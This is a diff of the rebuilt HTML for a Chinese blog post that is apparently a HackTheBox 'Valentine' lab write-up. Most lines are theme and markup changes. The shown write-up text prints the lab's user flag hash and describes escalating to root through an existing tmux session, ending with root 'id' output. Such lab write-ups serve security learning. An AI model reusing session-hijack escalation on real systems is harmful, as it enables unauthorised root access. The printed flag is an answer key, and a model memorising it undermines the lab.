 </span></span><span class="line"><span class="cl">root@Valentine:/tmp# cat /home/hype/user.txt 
-</span></span><span class="line"><span class="cl">0b946d1f7c12bb371585d67c10557dc8
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">0b946d1f7c12bb371585d67c10557dc8</span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="tmux提权">tmux提权</h3>
-<p>查看result.txt，发现tmux session</p>
-<p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429174112440.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174112440.png, resource/012-Valentine.assets/image-20230429174112440.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174112440.png 2x" sizes="auto" data-title="image-20230429174112440" data-alt="image-20230429174112440" width="1674" height="298" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</div><h3 id="tmux提权" class="heading-element"><span>tmux提权</span>
+  <a href="#tmux%e6%8f%90%e6%9d%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>查看result.txt，发现tmux session</p>
+<p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174112440.png" alt="image-20230429174112440" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174112440.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174112440.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174112440.png?size=large 2x" data-title="image-20230429174112440" style="--width: 1674px;--aspect-ratio: 1674 / 298;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>通过tmux进行提权，成功获取root权限：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -913,35 +853,33 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">root@Valentine:/tmp# id
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</span></span><span class="line"><span class="cl">root@Valentine:/tmp# 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">root@Valentine:/tmp# </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429174244442.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174244442.png, resource/012-Valentine.assets/image-20230429174244442.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174244442.png 2x" sizes="auto" data-title="image-20230429174244442" data-alt="image-20230429174244442" width="1584" height="446" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
-<h2 id="end">END</h2></div><div class="post-footer" id="post-footer">
+</div><p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174244442.png" alt="image-20230429174244442" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174244442.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174244442.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174244442.png?size=large 2x" data-title="image-20230429174244442" style="--width: 1584px;--aspect-ratio: 1584 / 446;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="end" class="heading-element"><span>END</span>
+  <a href="#end" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
-        <span title=2023-05-01&#32;19:55:27>更新于 2023-05-01&nbsp;</span>
+        <span title="更新于 2023-05-01 19:55:27">更新于 2023-05-01&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
       </div></div>
-    <div class="post-info-line">
-      <div class="post-info-md"></div>
-      <div class="post-info-share">
-        <span></span>
-      </div>
-    </div>
-  </div>
 
   <div class="post-info-more">
-    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/htb/' class="post-tag">HTB</a><a href='/tags/oscp/' class="post-tag">OSCP</a></section>
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/htb/" class="post-tag" title="标签 - HTB">HTB</a><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a></section>
     <section>
       <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
     </section>
-  </div>
-
-  <div class="post-nav"><a href="/posts/20230425-shellspawn/" class="post-nav-item" rel="prev" title="Shell Spawning"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Shell Spawning</a>
-      <a href="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" class="post-nav-item" rel="next" title="018-SQL注入之GroupBy位置点注入">018-SQL注入之GroupBy位置点注入<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+  </div><div class="post-nav"><a href="/posts/20230425-shellspawn/" class="post-nav-item" rel="prev" title="Shell Spawning"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Shell Spawning</a><a href="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" class="post-nav-item" rel="next" title="018-SQL注入之GroupBy位置点注入">018-SQL注入之GroupBy位置点注入<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
-<div id="comments"><div id="giscus">
+<div id="comments"><div id="giscus" class="comment">
           <script
             src="https://giscus.app/client.js"
             data-repo="XavierRoot/XavierBlog"
@@ -949,6 +887,7 @@
             data-category="Announcements"
             data-category-id="DIC_kwDOHswyxs4Cd2zm"
             data-mapping="title"
+            data-strict="0"
             
             data-theme="preferred_color_scheme"
             data-reactions-enabled="1"
@@ -963,13 +902,16 @@
         </div>
         <noscript>
           Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
-        </noscript></div></article></main><footer class="footer">
-    <div class="footer-container"><div class="footer-line statistics"></div><div class="footer-line visitor">
-          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </noscript></div></article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
         </div></div>
   </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
         </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
-    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
   </noscript>
-</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"lunr"},"twemoji":true};</script><script src="/js/theme.min.js" defer></script></body>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light","origin":"https://giscus.app"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30},"twemoji":true,"version":"v0.3.16"};</script><script src="/js/theme.min.js" defer></script></body>
 </html>
